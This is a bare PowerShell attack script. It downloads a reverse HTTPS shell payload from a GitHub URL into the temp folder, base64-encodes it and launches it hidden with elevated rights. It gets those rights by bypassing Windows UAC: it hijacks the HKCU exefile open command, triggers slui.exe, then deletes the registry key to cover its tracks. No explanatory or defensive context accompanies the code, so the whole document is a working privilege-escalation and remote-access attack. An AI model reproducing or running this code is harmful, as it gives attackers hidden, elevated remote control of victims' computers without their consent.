function DownloadFile {
  Param(
    [Parameter(Mandatory=$True)][array]$Uris
  )
  $cli = New-Object System.Net.WebClient
  foreach($u in $Uris){
    $uri = New-Object System.Uri($u)
    $file = Split-Path $uri.AbsolutePath -Leaf
    try{
      $fpath = (Join-Path $env:temp $file)
      $cli.DownloadFile($uri, (Join-Path $env:temp $file))
      $fpath
    }catch{
      continue
    }
  }
}

function Invoke-SluiBypass {
  [CmdletBinding()]
  Param
  (
    [Parameter(
      Mandatory=$True,
      ValueFromPipeline=$True,
      ValueFromPipelineByPropertyName=$True
    )]
    [string]$Command
  )
  $RegRoot = 'HKCU:\Software\Classes\exefile\shell\open'
  $Name = 'command'
  $OldValue = $null

  if(Test-Path $RegRoot) {
    $OldValue = Get-Item "$RegRoot\$Name" -ErrorAction SilentlyContinue
  }
  New-Item -Path $RegRoot -Name $Name -Value $Command -Force | Out-Null
  Start-Process 'C:\Windows\System32\slui.exe' -Verb RunAs -WindowStyle Hidden
  Sleep 3
  Remove-Item -Path $RegRoot -Recurse
}

$os = Get-WmiObject -Class Win32_OperatingSystem
If( $os.OSarchitecture.StartsWith("32") ){
  $powershell32 = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
}Else{
  $powershell32 = 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe'
}

$exploit = DownloadFile -Uris @('https://raw.githubusercontent.com/cx-jp/xl/master/192-168-1-60-reverse_https.ps1')
If( $exploit -ne $null ){
  $exploit += "`r`nfor(;;){ Sleep 10000 }"
  $e = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($exploit))
  $xpath = "$powershell32 -NoProfile -ExecutionPolicy unrestricted -WindowStyle Hidden -e $e"
  Invoke-SluiBypass -Command $xpath
}
